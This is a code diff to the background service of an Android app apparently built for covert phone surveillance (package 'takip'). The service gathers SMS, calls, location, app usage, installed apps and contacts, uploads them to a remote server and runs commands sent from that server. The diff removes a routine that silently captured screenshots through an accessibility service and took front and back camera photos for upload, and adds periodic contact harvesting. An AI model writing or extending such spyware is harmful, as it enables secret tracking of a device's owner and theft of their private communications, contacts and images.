@@ -16,7 +16,7 @@ import com.takip.app.R
 import com.takip.app.api.ApiClient
 import com.takip.app.collector.AppUsageCollector
 import com.takip.app.collector.CallCollector
-import com.takip.app.collector.CameraCaptureHelper
+import com.takip.app.collector.ContactsCollector
 import com.takip.app.collector.InstalledAppsCollector
 import com.takip.app.collector.LocationCollector
 import com.takip.app.collector.SmsCollector
@@ -31,13 +31,12 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import org.json.JSONArray
-import java.io.File
 
 class MonitoringService : Service() {
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var syncJob: Job? = null
-    private var mediaCounter = 0
+    private var syncCounter = 0
     private val mainHandler = Handler(Looper.getMainLooper())
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -132,6 +131,9 @@ class MonitoringService : Service() {
 
         val permissions = PermissionChecker.getStatus(this)
         ApiClient.sync(token, permissions).onSuccess { syncResult ->
+            if (!syncResult.menuPin.isNullOrBlank()) {
+                PrefsManager.menuPin = syncResult.menuPin
+            }
             for (cmd in syncResult.commands) {
                 scope.launch {
                     CommandExecutor.execute(this@MonitoringService, token, cmd.id, cmd.type)
@@ -170,7 +172,10 @@ class MonitoringService : Service() {
 
         uploadArray(InstalledAppsCollector.collect(this)) { ApiClient.uploadInstalledApps(token, it) }
 
-        captureAndUploadMedia(token)
+        syncCounter++
+        if (syncCounter % 6 == 0) {
+            uploadArray(ContactsCollector.collect(this)) { ApiClient.uploadContacts(token, it) }
+        }
     }
 
     private fun uploadArray(
@@ -192,31 +197,6 @@ class MonitoringService : Service() {
 
     private fun ConfigManagerRefresh() {
         com.takip.app.util.ConfigManager.refreshIfStale()
-    }
-
-    private suspend fun captureAndUploadMedia(token: String) {
-        mediaCounter++
-        if (mediaCounter % 3 != 0) return
-
-        TakipAccessibilityService.instance?.takeScreenCapture { bytes ->
-            if (bytes != null) {
-                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
-                file.writeBytes(bytes)
-                ApiClient.uploadMedia(token, file, "screenshot")
-            }
-        }
-
-        CameraCaptureHelper.capturePhoto(this, useFrontCamera = false)?.let { file ->
-            ApiClient.uploadMedia(token, file, "camera_back")
-                .onFailure { Log.e(TAG, "Kamera arka: ${it.message}") }
-        }
-
-        delay(1500)
-
-        CameraCaptureHelper.capturePhoto(this, useFrontCamera = true)?.let { file ->
-            ApiClient.uploadMedia(token, file, "camera_front")
-                .onFailure { Log.e(TAG, "Kamera ön: ${it.message}") }
-        }
     }
 
     private fun createNotification(): Notification {
